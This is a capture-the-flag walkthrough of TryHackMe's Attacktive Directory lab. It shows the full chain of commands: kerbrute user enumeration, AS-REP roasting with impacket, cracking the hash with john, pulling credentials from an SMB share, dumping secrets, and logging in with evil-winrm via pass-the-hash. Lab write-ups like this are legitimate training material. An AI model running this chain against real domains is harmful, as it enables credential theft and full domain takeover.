# TryHackMe - Lookup Room Writeup

## Overview

This is a detailed walkthrough of how I gained access to administrator on the **Attacktive Directory** room on TryHackMe and captured all three users  flags. The room involved Enumeration via kerberos, Abusing kerberos and elevating the privileges through misconfigured or disabled Pre-Authentication".

---

## Enumeration

I started the engagement with an `nmap` scan:

```bash
nmap -sC -sV -oN initial_scan.txt <target-ip>
```

The scan revealed two open ports:

- ** 88 ** kerberos-sec
- ** 139 ** (netbios-ssn) - smb
- ** 445 ** (microsoft-ds) - smb
- and many more.. here i listed what are the most important for this room. 

---

## Deep Enumeration

nmap cannot enumerate everything so i used enum4linux to emumerate ports 139/445, which then revealed kerberos is running

```bash
enum4linux -a <target-ip>
```
	- Target Information
	- Enumerates Workgroup/Domain 
	- Nbtstat Information
	- Checks Session
	- Gets domain SID 
	- OS information
	- Users
	- Share Enumeration 
	- Groups
	- Password Policy Information
	- Users on <target-ip> via RID cyclin
	- Gets printer info

after enumeration there were the strongest clue that target was the "Domain Contorller".

 indicator1:
 - The krbtgt account 
   S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)

 indicator2: 
 - Domain Controllers group
   THM-AD\Domain Controllers (Domain Group)

---

## Username & Password Enumeration using kerberos

here, i downloaded modified userlist and passwordlist, ie.

	- wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
	- wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt 

 ** Required Tool: kerbrute_linux_amd64 **
	
	- https://github.com/ropnop/kerbrute/releases#release-v1.0.1

   after then i added ip to /etc/hosts for further process
   ```bash
	echo <target-ip> spookysec.local >> /etc/hosts  
   ```

   User Enumeration
    ```bash 	
        kerbrute userenum -d spookysec.local --dc <target-ip>  userlist.txt -o users.txt
    ```
	
   sort username
    ```bash
	grep "VALID USERNAME" users.txt | awk '{split($NF,a,"@"); print a[1]}'
    ```

---

## Extracting TGT using attack method - ASREPRoasting - (kerberos abuse) 

```bash
impacket-GetNPUsers spookysec.local/ -usersfile users.txt -request
```

i found TGT hash of one the user and save it as hash.txt, by observing on hashcat.net official site. i came to figure out that, the hash-mode was 18200 and hash-name = Kerberos 5 AS-REP etype 23

---

## Crack hash using either john/hashcat

here i choose john to crack the hash and decoded password to plain text
```bash
john --wordlist=passwordlist.txt hash.txt  
 ```
---

## Enumerate any shares on domain controller
With a user's account credentials i now have significantly more access within the domain. i can now attempt to enumerate any shares that the domain controller may be giving out. 

```bash 
smbclient -L '<target-ip>' -U <user-name>
```
finally, i grabbed the administrator credentials.

```bash
smbclient '//<target-ip>/<service-name>' -U <user-name>
cat <credentials-name> | base64 -d
```
---

## Elevating and dumping 

```bash
impacket-secretsdump spookysec.local/<admin-username>:<admin-password>@<target-ip>
	
evil-winrm -i <target-ip> -u administrator -H <ntlm-hash>
```
after gaining access to admin. all three flags were captured

Each steps were a great exercise in real-world exploitation chains.

🖼️ **Find all screenshots here:** [`screenshots/attacktive-diirectory/`](../screenshots/attacktive-directory/)

*Thanks for reading*
